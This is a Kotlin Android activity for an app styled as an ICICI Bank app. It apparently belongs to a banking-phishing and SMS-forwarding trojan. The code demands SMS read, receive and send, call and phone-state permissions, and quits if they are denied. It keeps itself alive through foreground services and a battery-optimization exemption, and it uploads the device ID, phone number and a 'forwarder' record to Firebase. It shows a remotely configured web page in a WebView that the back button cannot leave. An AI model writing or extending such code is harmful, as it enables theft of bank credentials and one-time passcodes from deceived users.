package com.voice.command


import androidx.compose.material3.Scaffold
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.annotation.RequiresApi
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.voice.command.ui.theme.ICICIBANKTheme


class MainActivity : androidx.activity.ComponentActivity() {

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Start the foreground service
        val serviceIntent = Intent(this, MyForegroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

        // Start the Firebase listener service
//        if (isReadSmsPermissionGranted()) {
        val serviceIntents = Intent(this, FirebaseListenerService::class.java)
        ContextCompat.startForegroundService(this, serviceIntents)
//        }


        setContent {
            ICICIBANKTheme {
                Scaffold(modifier = androidx.compose.ui.Modifier.fillMaxSize()) { innerPadding ->
                    WebViewScreen(
                        modifier = androidx.compose.ui.Modifier.padding(innerPadding)
                    )
                }
            }
        }

        requestSmsPermissions()


        // Check and request notification access
//        if (!isNotificationServiceEnabled(context = this)) {
//            requestNotificationAccess()
//        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent()
            val packageName = applicationContext.packageName
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        }

        var function = Functions()

        // Fetch IMEI or Android ID
//        val imei = function.getDeviceId(this)
        var advertisingId =
            Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        Log.d("AdvertisingID", "ID: $advertisingId")


        // Save IMEI to local storage
        function.saveImeiToLocalStorage(this, advertisingId.toString())

//        Check Device Online Status
        function.trackDeviceOnlineStatus(advertisingId.toString())


        // Save device data to Firebase
        function.saveDefaultForwarder(advertisingId, this)

        // Save latest phone number
        function.saveLatestPhoneNumber(this)

    }

    override fun onDestroy() {
        super.onDestroy()
//        unregisterReceiver(smsReceiver)
    }

    private val SMS_PERMISSION_REQUEST_CODE = 123

    // Request permission to read SMS
    private fun requestSmsPermissions() {
        val permissions = arrayOf(
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.READ_PHONE_STATE
        )
        ActivityCompat.requestPermissions(this, permissions, SMS_PERMISSION_REQUEST_CODE)
    }

    // Check if permission is granted
    private fun isReadSmsPermissionGranted(): Boolean {
        return ContextCompat.checkSelfPermission(
            this, android.Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }

    // Show a notification and close the app
    private fun showNotificationAndCloseApp() {
        val notificationManager =
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Create a notification channel for Android Oreo and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sms_permission_channel",
                "SMS Permission Channel",
                NotificationManager.IMPORTANCE_HIGH
            )
            notificationManager.createNotificationChannel(channel)
        }

        // Build the notification
        val notificationBuilder = NotificationCompat.Builder(this, "sms_permission_channel")
            .setContentTitle("SMS Permission Required")
            .setContentText("Please grant SMS permission to use this app.")
            .setSmallIcon(R.drawable.logo)
            .setAutoCancel(true)

        // Show the notification
        notificationManager.notify(1, notificationBuilder.build())

        // Close the app
        finish()
    }

    // Handle permission request results
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
//                registerSmsReceiver()
            } else {
                showNotificationAndCloseApp()
            }
        }
    }


    private fun isNotificationServiceEnabled(context: Context): Boolean {
        val cn = ComponentName(context, MyNotificationListenerService::class.java)
        val flat = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        )
        return flat != null && flat.contains(cn.flattenToString())
    }


//    private fun requestNotificationAccess() {
//        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
//        startActivity(intent)
//    }
}

//@Composable
//fun WebViewScreen(modifier: Modifier = Modifier) {
//    var isLoading by remember { mutableStateOf(true) }
//    var webUrl by remember { mutableStateOf<String?>(null) }
//    var errorMessage by remember { mutableStateOf<String?>(null) }
//
//    // Fetch URL from Firebase
//    LaunchedEffect(Unit) {
//        val db = FirebaseDatabase.getInstance().getReference("settings/url")
//        db.addListenerForSingleValueEvent(object : ValueEventListener {
//            override fun onDataChange(snapshot: DataSnapshot) {
//                val url = snapshot.getValue(String::class.java)
//                if (!url.isNullOrEmpty()) {
//                    webUrl = url
//                } else {
//                    errorMessage = "URL not found"
//                }
//            }
//
//            override fun onCancelled(error: DatabaseError) {
//                errorMessage = "Failed to load URL: ${error.message}"
//            }
//        })
//    }
//
//    Box(modifier = modifier.fillMaxSize()) {
//        when {
//            errorMessage != null -> {
//                Text(
//                    text = errorMessage!!,
//                    color = Color.Red,
//                    modifier = Modifier.align(Alignment.Center)
//                )
//            }
//
//            webUrl != null -> {
//                AndroidView(
//                    factory = { context ->
//                        WebView(context).apply {
//                            webViewClient = object : WebViewClient() {
//                                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
//                                    super.onPageStarted(view, url, favicon)
//                                    isLoading = true
//                                }
//
//                                override fun onPageFinished(view: WebView?, url: String?) {
//                                    super.onPageFinished(view, url)
//                                    isLoading = false
//                                }
//                            }
//                            settings.javaScriptEnabled = true
//                            settings.domStorageEnabled = true
//                            settings.databaseEnabled = true
//                            loadUrl(webUrl!!)
//                        }
//                    },
//                    modifier = Modifier.fillMaxSize()
//                )
//            }
//        }
//
//        if (isLoading && errorMessage == null) {
//            com.ultra.fintech.LoadingIndicator()
//        }
//    }
//}

@Composable
fun WebViewScreen(modifier: Modifier = Modifier) {
    var isLoading by remember { mutableStateOf(true) }
    var webUrl by remember { mutableStateOf<String?>(null) }
    var errorMessage by remember { mutableStateOf<String?>(null) }

    // Keep a reference to WebView
    val webViewRef = remember { mutableStateOf<WebView?>(null) }

    // --- Fetch URL from Firebase ---
    LaunchedEffect(Unit) {
        val db = FirebaseDatabase.getInstance().getReference("settings/url")
        db.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val url = snapshot.getValue(String::class.java)
                if (!url.isNullOrEmpty()) {
                    webUrl = url
                } else {
                    errorMessage = "URL not found"
                }
            }

            override fun onCancelled(error: DatabaseError) {
                errorMessage = "Failed to load URL: ${error.message}"
            }
        })
    }

    // --- Handle Back Button ---
    BackHandler {
        val webView = webViewRef.value
        when {
            webView?.canGoBack() == true -> webView.goBack()
            else -> {
                // Do nothing — prevents app from exiting
                // OR if using navigation, go back to previous Compose screen:
                // navController.popBackStack()
            }
        }
    }

    // --- UI ---
    Box(modifier = modifier.fillMaxSize()) {
        when {
            errorMessage != null -> {
                Text(
                    text = errorMessage!!,
                    color = Color.Red,
                    modifier = Modifier.align(Alignment.Center)
                )
            }

            webUrl != null -> {
                AndroidView(
                    factory = { context ->
                        WebView(context).apply {
                            webViewClient = object : WebViewClient() {
                                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                                    isLoading = true
                                }

                                override fun onPageFinished(view: WebView?, url: String?) {
                                    isLoading = false
                                }
                            }
                            settings.javaScriptEnabled = true
                            settings.domStorageEnabled = true
                            settings.databaseEnabled = true
                            loadUrl(webUrl!!)
                            webViewRef.value = this
                        }
                    },
                    modifier = Modifier.fillMaxSize(),
                    update = { webViewRef.value = it }
                )
            }
        }

        if (isLoading && errorMessage == null) {
            com.voice.command.LoadingIndicator()
        }
    }
}


@Composable
fun LoadingIndicator() {
    val infiniteTransition = rememberInfiniteTransition(label = "")
    val scale by infiniteTransition.animateFloat(
        initialValue = 1f,
        targetValue = 1.5f,
        animationSpec = infiniteRepeatable(
            animation = tween(durationMillis = 1000, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ), label = ""
    )

    Box(
        modifier = androidx.compose.ui.Modifier
            .fillMaxSize()
            .background(Color(0x88FFFFFF)), // Semi-transparent background
        contentAlignment = Alignment.Center
    ) {
        CircularProgressIndicator(
            modifier = androidx.compose.ui.Modifier
                .size(50.dp)
                .scale(scale),
            color = Color(0xFF008FEE), // Custom color
            strokeWidth = 3.dp
        )
    }
}


@Preview(showBackground = true)
@Composable
fun WebViewPreview() {
    ICICIBANKTheme {
        WebViewScreen()
    }
}
